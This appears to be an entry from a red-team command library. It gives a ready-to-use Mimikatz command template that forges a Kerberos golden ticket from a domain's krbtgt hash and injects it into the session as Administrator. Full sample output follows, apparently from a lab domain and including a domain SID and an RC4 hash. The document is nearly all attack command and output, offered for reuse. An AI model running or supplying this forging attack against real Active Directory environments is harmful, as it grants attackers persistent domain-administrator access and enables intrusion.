---
id: e0fcd486-eeb0-4da4-888e-08f203c064a6
name: Mimikatz Create a Golden Ticket with the krbtgt hash
type: command
executor: ''
data: Mimikatz.exe "kerberos::golden /domain:$_DOMAIN /sid:$_DOMAIN_SID /rc4:$_NTLM_HASH
  /user:Administrator /ptt" "exit"
output: "PS C:\\Windows\\system32\\spool\\drivers\\color> Mimikatz.exe \"kerberos::golden\
  \ /domain:dev.admin.offshore.com /sid:S-1-5-21-1416445593-394318334-2645530166 /rc4:9404def404bc198fd9830a3483869e78\
  \ /user:Administrator /ptt\" \"exit\"\n\n  .#####.   mimikatz 2.2.0 (x64) #18362\
  \ May  9 2020 20:52:48\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\\
  \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##\
  \       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX\
  \             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com\
  \ / http://mysmartlogon.com   ***/\n\nmimikatz # kerberos::golden /domain:dev.admin.offshore.com\
  \ /sid:S-1-5-21-1416445593-394318334-2645530166 /rc4:9404def404\nbc198fd9830a3483869e78\
  \ /user:Administrator /ptt\nUser      : Administrator\nDomain    : dev.admin.offshore.com\
  \ (DEV)\nSID       : S-1-5-21-1416445593-394318334-2645530166\nUser Id   : 500\n\
  Groups Id : *513 512 520 518 519\nServiceKey: 9404def404bc198fd9830a3483869e78 -\
  \ rc4_hmac_nt\nLifetime  : 7/6/2020 11:52:12 PM ; 7/4/2030 11:52:12 PM ; 7/4/2030\
  \ 11:52:12 PM\n-> Ticket : ** Pass The Ticket **\n\n * PAC generated\n * PAC signed\n\
  \ * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\n\
  Golden ticket for 'Administrator @ dev.admin.offshore.com' successfully submitted\
  \ for current session\n\nmimikatz # exit"
created_at: '2020-07-07T04:30:50.323081+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Mimikatz Create a Golden Ticket with the krbtgt hash

```bash
Mimikatz.exe "kerberos::golden /domain:$_DOMAIN /sid:$_DOMAIN_SID /rc4:$_NTLM_HASH /user:Administrator /ptt" "exit"
```

## Expected Output

```
PS C:\Windows\system32\spool\drivers\color> Mimikatz.exe "kerberos::golden /domain:dev.admin.offshore.com /sid:S-1-5-21-1416445593-394318334-2645530166 /rc4:9404def404bc198fd9830a3483869e78 /user:Administrator /ptt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 May  9 2020 20:52:48
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # kerberos::golden /domain:dev.admin.offshore.com /sid:S-1-5-21-1416445593-394318334-2645530166 /rc4:9404def404
bc198fd9830a3483869e78 /user:Administrator /ptt
User      : Administrator
Domain    : dev.admin.offshore.com (DEV)
SID       : S-1-5-21-1416445593-394318334-2645530166
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 9404def404bc198fd9830a3483869e78 - rc4_hmac_nt
Lifetime  : 7/6/2020 11:52:12 PM ; 7/4/2030 11:52:12 PM ; 7/4/2030 11:52:12 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dev.admin.offshore.com' successfully submitted for current session

mimikatz # exit
```


